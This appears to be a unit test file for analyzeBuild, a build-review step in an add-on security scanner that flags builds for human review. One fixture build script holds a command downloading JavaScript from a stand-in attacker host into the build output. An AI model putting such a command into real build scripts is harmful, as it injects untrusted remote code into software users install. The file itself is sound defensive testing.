// Unit tests for analyzeBuild: the SCA build review's one look at the build, run in
// setup and stored on addon.buildFiles.buildReview for the input:build checks to read.
// Nothing classifies what a build DOES, so the record it produces says only whether
// there is a build to reproduce - which is the question undeclared-build-source turns
// into the reviewer's escalation.

import { test } from "node:test";
import assert from "node:assert/strict";

import { analyzeBuild } from "../../src/build/analyze.js";

const build = (obj) => ({
  files: new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)])),
});

// A package.json with a build script is an entry point to follow, so there IS a build:
// classification stays null and `analyzed` false, which is what routes the whole build
// to the reviewer. The anchor is package.json when present, so the escalation lands there.
test("analyzeBuild records a build that exists as unanalyzed, anchored at package.json", () => {
  const out = analyzeBuild({
    build: build({
      "package.json": JSON.stringify({
        name: "x",
        scripts: { build: "webpack" },
      }),
    }),
  });
  assert.equal(out.classification, null);
  assert.equal(out.analyzed, false);
  assert.equal(out.anchor, "package.json");
});

// No entry point to follow means there is no build to reproduce, so the record says
// "none" - the one value undeclared-build-source treats as nothing to report.
test("analyzeBuild reports no build when there is no entry point", () => {
  assert.equal(analyzeBuild({ build: build({}) }).classification, "none");
  assert.equal(analyzeBuild({ build: undefined }).classification, "none");
});

// The deterministic signals selectBuildCorpus could not follow ride along, so the
// escalation can name them. They are the only detail the record carries.
test("analyzeBuild carries the unresolved build steps through", () => {
  const out = analyzeBuild({
    build: build({
      "package.json": JSON.stringify({ scripts: { build: "sh ./make.sh" } }),
      "make.sh": "curl https://evil.example/x.js -o dist/x.js\n",
    }),
  });
  assert.ok(Array.isArray(out.unresolved));
});
